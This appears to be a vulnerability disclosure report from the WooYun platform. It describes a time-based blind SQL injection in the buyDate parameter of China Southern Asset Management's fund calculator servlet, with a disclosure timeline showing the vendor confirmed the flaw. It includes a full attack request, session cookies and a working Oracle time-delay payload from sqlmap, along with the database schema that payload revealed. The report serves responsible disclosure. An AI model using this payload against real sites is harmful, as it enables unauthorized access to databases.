wybug_title: 南方基金主站时间盲注一枚
wybug_corp: 南方基金管理有限公司
wybug_detail:
漏洞详情 披露状态：   									2015-07-26：	细节已通知厂商并且等待厂商处理中									2015-07-27：	厂商已经确认，细节仅向厂商公开									2015-08-06：	细节向核心白帽子及相关领域专家公开									2015-08-16：	细节向普通白帽子公开									2015-08-26：	细节向实习白帽子公开									2015-09-10：	细节向公众公开  简要描述： 希望多给些RANK 详细说明：  

只要计算器有时间的判断就一个参数buyDate存在oracle时间盲注


POST /CalFundSylServlet HTTP/1.1Host: www.nffund.comProxy-Connection: keep-aliveContent-Length: 166Accept: application/json, text/javascript, */*; q=0.01Origin: http://www.nffund.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.nffund.com/nfjj/calculator/tzsy.jspAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: uc_visitorid=417020122; JSESSIONID=ZxQ4V0CWRtpL7KpGCjgMpQGytT1QdsBmTmDLPWSPxK2yyGwntNJG!2056481154; Hm_lvt_cea998b3b8fd3029b233c254de0698a2=1435889768; Hm_lpvt_cea998b3b8fd3029b233c254de0698a2=1435889864; Hm_lvt_8f1647749e9291de366666c8e7bf6482=1435890202,1435890450; Hm_lpvt_8f1647749e9291de366666c8e7bf6482=1435890450; Hm_lvt_64932a435c8e1a1810a1673c4ab6e774=1435889228,1435890202,1435890450; Hm_lpvt_64932a435c8e1a1810a1673c4ab6e774=1435890450; Hm_lvt_ff68adc93b9c9fa02aa65c4ac46f95f1=1435890014,1435890017,1435890082,1435891120; Hm_lpvt_ff68adc93b9c9fa02aa65c4ac46f95f1=1435891120fundcode=202001&subscriptionAmount=11&buyDate=2015-07-02[注入点]&buyNav=1.2941&subscriptionRates=111&bonusFlag=1&redeemDate=2015-07-02&redeemNav=1.2941&redemptionRates=1
sqlmap验证
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:Place: POSTParameter: buyDate    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: fundcode=202001&subscriptionAmount=11&buyDate=2015-07-02' AND 1726=DBMS_PIPE.RECEIVE_MESSAGE(CHR(74)||CHR(117)||CHR(98)||CHR(70),5) AND 'Kvgi'='Kvgi&buyNav=1.2941&subscriptionRates=111&bonusFlag=1&redeemDate=2015-07-02&redeemNav=1.2941&redemptionRates=1---current schema (equivalent to database on Oracle):    'NFJJ'
